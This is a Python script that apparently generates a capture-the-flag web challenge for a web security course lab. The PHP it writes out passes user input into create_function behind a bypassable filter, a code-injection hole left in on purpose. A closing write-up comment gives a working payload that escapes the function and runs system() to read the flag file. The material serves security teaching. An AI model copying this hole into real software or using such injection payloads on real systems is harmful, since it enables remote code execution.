# -*- coding: utf-8 -*-

import re
import os

from .refObject import refObject
from .sourceHelper import sourceHelper

"""
When your class inherits from refObject, you are available to use all methods and members from module's instance, such as:
    self.fp: Instance of filePointer
    self.payloads: Payloads of loaded module
"""


class instanceSample(refObject):
    """This script generates a web challenge for lab2 of Web Security Advanced."""

    # Because main(self) is an entry function, every initialization should be
    # setup here.
    def main(self):
        # Use mod_lfi as base module.
        self.gen_instance.parse("set modules = +unfilter")
        self.gen_instance.parse("set expose = 8084")
        self.gen_instance.fp.changeTarget(target="index.html")

    @staticmethod
    def __call__(self):
        # index.php
        index = """
        <?php
            if(isset($_GET['submit'])) {
                if((strpos($_SERVER["REQUEST_URI"], '_') === false) && ($_GET['se_cret'] === 'mysecret')) {
                    $funcBody = $_GET['funcBody'];
                    $new = create_function('', "return 'Hello $funcBody';");
                    echo $new();
                } else {
                    die('Hacker detected!');
                }
            } else {
                echo <<< EOF
                <form method="GET" action="" role="form">
                    <div>
                        <label for="function body">Function body</label>
                        <input type="text" name="funcBody" placeholder="Enter function body">
                        <input type="hidden" name="se_cret" value="mysecret">
                    </div>
                    <input type="submit" value="Submit" name="submit"/>
                    <input type="reset" value="Clear"/>  
                </form>
EOF;
                die(highlight_file(__FILE__, TRUE));
            }
        ?>
        """

        self.fp.write(os.path.join(self.fp.path, "index.php"),
                      index, ext=None)

    @staticmethod
    def generateHandler(self, tree_node=None, o=None, elem=None):
        """
        tree_node: An ElementTree for the root node of the preprocessing file(line number included) in this context.
        o: Original unpreprocessing file
        elem: Entries of infos of staged nodes
        """
        self.settings['cmd'] = 'echo "FLAG{h4h4h4~0day!}" > /here_is_your_flag'

"""
Write up:
    - http://127.0.0.1:8084/
?funcBody=';}system('cat `echo L2hlcmVfaXNfeW91cl9mbGFn | base64 -d`');/*
&se%20cret=mysecret
&submit=Submit
"""
